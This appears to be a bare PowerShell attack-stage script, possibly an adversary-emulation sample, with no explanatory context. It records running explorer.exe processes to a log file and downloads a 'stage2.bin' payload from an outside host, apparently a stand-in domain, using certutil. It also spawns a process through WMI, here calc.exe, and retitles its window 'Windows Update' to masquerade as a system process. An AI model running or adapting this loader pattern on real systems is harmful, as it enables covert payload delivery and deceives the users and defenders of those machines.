$EndpointUrl = "https://adatum.com/stage2.bin"
$PayloadPath = "$env:TEMP\stage1.bin"
$TimeoutSec = 90
$ErrorActionPreference = "Continue"

Write-Verbose "Collecting process inventory"
Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "$env:APPDATA\stage.log" -Append -ErrorAction SilentlyContinue
certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
$OperationResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" } -ErrorAction SilentlyContinue
Write-Verbose ("Process ID: " + $OperationResult.ProcessId)

Write-Verbose "stage marker 33 reached"
$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Verbose "Collecting host metadata"
Write-Verbose "Stage handoff finished"
